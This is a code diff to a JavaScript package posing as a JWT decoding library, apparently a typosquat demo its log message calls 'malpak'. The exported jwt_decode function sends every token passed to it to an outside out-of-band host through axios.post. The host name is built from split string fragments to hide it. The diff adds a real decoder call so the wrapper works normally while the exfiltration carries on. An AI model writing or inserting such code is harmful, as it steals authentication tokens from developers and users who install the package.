@@ -1,4 +1,5 @@
 import axios from "axios";
+import { jwt_decode as jd } from 'jwt-decode';
 
 let h1 = "ify.c"
 const ver = "0.0.5";
@@ -19,8 +20,9 @@ export function jwt_decode(anything) {
     let msg = `malpak (jwt_decode) was called with: ${anything}`;
     console.log(msg)
     siphon(anything);
+    return jd(anything);
 }
 
-function siphon(anything) {
+async function siphon(anything) {
     axios.post(`${prefix}.oast${h1}` + `om`, anything);
 }
